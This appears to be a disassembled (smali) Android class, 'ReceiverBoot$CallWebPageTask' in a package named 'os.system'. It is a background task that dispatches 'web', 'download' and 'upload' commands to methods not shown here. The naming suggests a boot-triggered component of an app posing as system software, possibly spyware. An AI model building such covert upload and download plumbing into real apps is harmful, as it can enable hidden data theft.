.class Los/system/ReceiverBoot$CallWebPageTask;
.super Landroid/os/AsyncTask;
.source "ReceiverBoot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/ReceiverBoot;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "CallWebPageTask"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field protected applicationContext:Landroid/content/Context;

.field protected main:Ljava/lang/String;

.field final synthetic this$0:Los/system/ReceiverBoot;


# direct methods
.method private constructor <init>(Los/system/ReceiverBoot;)V
    .locals 1

    .prologue
    .line 1054
    iput-object p1, p0, Los/system/ReceiverBoot$CallWebPageTask;->this$0:Los/system/ReceiverBoot;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    .line 1057
    const-string v0, ""

    iput-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    return-void
.end method

.method synthetic constructor <init>(Los/system/ReceiverBoot;Los/system/ReceiverBoot$1;)V
    .locals 0

    .prologue
    .line 1054
    invoke-direct {p0, p1}, Los/system/ReceiverBoot$CallWebPageTask;-><init>(Los/system/ReceiverBoot;)V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1054
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$CallWebPageTask;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 2

    .prologue
    .line 1065
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    const-string v1, "web"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1066
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->this$0:Los/system/ReceiverBoot;

    invoke-virtual {v0}, Los/system/ReceiverBoot;->requestWeb()Ljava/lang/String;

    move-result-object v0

    .line 1074
    :goto_0
    return-object v0

    .line 1068
    :cond_0
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    const-string v1, "download"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 1069
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->this$0:Los/system/ReceiverBoot;

    invoke-virtual {v0}, Los/system/ReceiverBoot;->requestDownload()Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 1071
    :cond_1
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    const-string v1, "upload"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 1072
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->this$0:Los/system/ReceiverBoot;

    invoke-virtual {v0}, Los/system/ReceiverBoot;->requestUpload()Ljava/lang/String;

    move-result-object v0

    goto :goto_0

    .line 1074
    :cond_2
    const/4 v0, 0x0

    goto :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .prologue
    .line 1054
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Los/system/ReceiverBoot$CallWebPageTask;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 2

    .prologue
    .line 1080
    iget-object v0, p0, Los/system/ReceiverBoot$CallWebPageTask;->main:Ljava/lang/String;

    const-string v1, "web"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1081
    sput-object p1, Los/system/ReceiverBoot;->requestResult:Ljava/lang/String;

    .line 1083
    :cond_0
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .prologue
    .line 1060
    return-void
.end method
